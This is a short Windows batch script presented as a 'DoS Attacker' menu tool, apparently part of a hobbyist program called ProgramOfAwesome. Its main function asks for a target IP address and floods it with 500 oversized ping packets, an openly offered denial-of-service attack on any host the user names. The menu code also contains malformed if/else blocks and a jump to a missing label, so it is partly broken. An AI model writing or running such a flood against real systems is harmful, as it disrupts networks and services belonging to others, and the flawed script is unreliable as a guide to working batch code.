@echo off
title DoS Attacker!! - PoA
color B
::ll
:DOSmenu
cls
echo ________________________________________________________________________________
echo  			    DoS Attacker!! - PoA
echo --------------------------------------------------------------------------------
echo Welcome to DOS attacker by zerfgog.
echo .              For the program to start, type "start"
echo .              To return to PoA menu, type "exit"
set /P DOSmain=:
if /I %DOSmain%==start goto :DOSchoice  (
) else (
if /I %DOSmain%==exit call ProgramOfAwesome.bat  (
) else (
if not %DOSmain%==[start/exit] goto :DOSmenu
)
)

:DOSchoice
cls
echo ________________________________________________________________________________
echo  				DoS Attacker!!
echo --------------------------------------------------------------------------------
echo Welcome to DOS attacker by zerfgog. Where would you like to attack?
echo L=localhost X=somewhere else
set /P DOSc=:
if /I %DOSc%==L goto :localhost  (
) else (
if /I %DOSc%==X goto :somewhere_else  (
) else (
if not %DOSc%==[L/X] goto :DOSchoice
)
)

:localhost
echo.
ping localhost
pause
cls
goto :dosdone

:somewhere_else
echo.
echo Manually insert IP address of target.
echo .		Enter the IP address you want to DoS:
set /p DOSip=:
ping %DOSip% -n 500 -l 65500 -w 10
goto :dosdone

:dosdone
cls
echo ________________________________________________________________________________
echo  				DoS Attacker!!
echo --------------------------------------------------------------------------------
echo So what did you do while you were waiting? Make a sandwich? I knew you did.
echo Now you can either exit or go back to the menu. Which is it?
set /P DOSend=:
if /I %DOSend%==menu goto :menu  (
) else (
if /I %DOSend%==exit call ProgramOfAwesome.bat  (
) else (
if not %DOSend%==[menu/exit] goto :dosdone
)
)